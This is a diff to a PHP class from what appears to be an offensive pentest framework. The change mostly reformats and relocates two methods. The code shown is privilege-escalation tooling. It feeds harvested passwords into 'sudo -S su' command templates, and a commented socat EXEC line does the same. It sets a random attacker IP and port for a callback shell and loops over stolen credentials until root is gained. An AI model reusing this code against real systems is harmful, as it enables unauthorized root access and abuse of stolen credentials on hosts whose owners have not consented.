@@ -19,11 +19,6 @@ class check4linux8users extends check4linux{
     
     
     
-    
-    
-  
-    
-    
     public function users4root($user_name,$user_pass){
         $this->ssTitre(__FUNCTION__);
         $user_name = trim($user_name);
@@ -32,28 +27,30 @@ class check4linux8users extends check4linux{
         $attacker_port = rand(1024,65535);
         //$attacker_port = 7777;
         $shell = "/bin/bash";
-        //$template_id_euid = "( sleep $this->stream_timeout*3 ;echo $user_pass; sleep 5;) |  socat - EXEC:\"su --login $user_name --shell $shell --command %ID%\",pty,stderr,setsid,sigint,ctty,sane";       
-        $template_id_euid = "echo '$user_pass' | sudo -S su --login '$user_name' --shell $shell --command '%ID%' ";       
+        //$template_id_euid = "( sleep $this->stream_timeout*3 ;echo $user_pass; sleep 5;) |  socat - EXEC:\"su --login $user_name --shell $shell --command %ID%\",pty,stderr,setsid,sigint,ctty,sane";
+        $template_id_euid = "echo '$user_pass' | sudo -S su --login '$user_name' --shell $shell --command '%ID%' ";
         
-
+        
         return $this->lan2pentest8id($template_id_euid, $attacker_ip, $attacker_port, $shell);
         
-  }
+    }
+    
+    
+    
+    public function users2root(){
+        $this->titre(__FUNCTION__);
+        $users_passwd = $this->ip2users4passwd();
+        foreach ($users_passwd as $user2name => $user2pass){
+            if (!empty($user2name))
+                if (!$this->ip2root8db($this->ip2id)) $this->users4root($user2name,$user2pass);
+                foreach ($this->tab_users_shell as $user2name_shell)
+                    if (!$this->ip2root8db($this->ip2id)) $this->users4root($user2name_shell,$user2pass);
+        }
+        $this->pause();
+        
+    }
     
 
-    
-  public function users2root(){
-      $this->titre(__FUNCTION__);
-      $users_passwd = $this->ip2users4passwd();
-      foreach ($users_passwd as $user2name => $user2pass){
-          if (!empty($user2name))
-              if (!$this->ip2root8db($this->ip2id)) $this->users4root($user2name,$user2pass);
-              foreach ($this->tab_users_shell as $user2name_shell)
-              if (!$this->ip2root8db($this->ip2id)) $this->users4root($user2name_shell,$user2pass);
-      }
-      $this->pause();
-      
-  }
   
   
     public function users(){
